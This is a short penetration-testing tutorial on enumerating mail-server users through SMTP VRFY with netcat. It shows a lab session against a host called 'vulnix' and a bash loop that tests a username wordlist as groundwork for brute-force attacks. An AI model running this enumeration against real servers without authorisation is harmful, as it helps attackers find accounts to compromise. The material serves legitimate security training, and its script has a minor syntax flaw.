# SMTP Mail User Enumeration
In this module we will learn how to attempt to enumerate users from a target system that is running Dovecot or Exim, or some other form of mail server.
## User List
When using **any** type of brute force attack, it is VERY important to enumerate as much as possible to build the best word list, in our case is a user list. In most cases, at least, add the enumerated hostname as a user. Look for weblogs and anything else that may contain reused UIDs, email addresses, or more.
## Using Netcat
To use Netcat to connect to a mail server simply do:

`root@kali:~# nc (TARGET IP ADDRESS) 25`

Next, we can use some helpful commands that could tell us more about the system. In this case, we wuse `VRFY`

```
wnl8:/pwnt/smtp# nc 192.168.161.129 25
220 vulnix ESMTP Postfix (Ubuntu)
VRFY vulnix
252 2.0.0 vulnix
VRFY root
252 2.0.0 root
VRFY dovecot
252 2.0.0 dovecot
VRFY nonexistentuser
550 5.1.1 <nonexistentuser>: Recipient address rejected: User unknown in local recipient table
^C
wnl8:/pwnt/smtp#
```

As you can see, when a valid user is identified by the mail server via the `VRFY` command, it returned `252 2.0.0 (USERNAME)` and when an invalid user was tested via `VRFY` the service returned `550 5.1.1 (USERNAME)`

## SMTP User Enumeration Automation
We can easily script this process by echoing the VRFY command directly into a netcat connection command for each name in a word list against the target server as so,
```
#!/bin/bash
while read user;
 do
  echo VRFY $user | nc -nv -w (TARGET IP ADDRESS) (TARGET SMTP PORT) 2>/dev/null | egrep "^252"
 done
< /path/to/usernames.txt
```
